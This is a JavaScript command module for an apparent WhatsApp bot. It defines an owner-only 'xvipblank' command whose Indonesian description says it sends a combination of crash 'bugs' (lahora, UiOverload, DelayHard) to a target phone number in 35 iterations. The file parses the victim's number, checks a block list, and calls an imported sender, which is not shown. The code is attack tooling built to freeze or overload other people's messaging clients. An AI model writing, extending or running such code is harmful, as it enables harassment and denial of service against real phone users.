import {
  sendXvipBlank,
  requirePhoneTarget,
  getBugTargetBlockReason,
  replyProcessing,
  replyDone,
  replyFailed,
} from "@/src/services/system/bug/index.js";

export default {
  name: "xvipblank",
  aliases: [],
  description: "Kirim kombo bug lahora + UiOverload + DelayHard ke nomor target (35 iterasi)",
  usage: "628xxx",
  category: "Bug",
  ownerOnly: true,
  run: async (sock, msg, args, { reply, prefix, commandName, isPrimarySuperOwner, logger }) => {
    const q = args.join(" ");
    if (!q) return reply(`*Syntax Eror*\nExample: ${prefix + commandName} 628xxx`);
    let target;
    try {
      target = requirePhoneTarget(q);
    } catch (_) {
      return reply(`*Syntax Eror*\nExample: ${prefix + commandName} 628xxx`);
    }
    const blocked = getBugTargetBlockReason(sock, target, { isPrimarySuperOwner });
    if (blocked) return reply(blocked);
    await replyProcessing(reply, target, commandName);
    try {
      const { success, failed, ms } = await sendXvipBlank(sock, target, { loops: 35, logger });
      await replyDone(reply, target, commandName, { success, failed, ms });
    } catch (err) {
      logger?.error?.(`[xvipblank] gagal ke ${target}: ${err?.message || err}`);
      await replyFailed(reply, target, commandName, err);
    }
  },
};
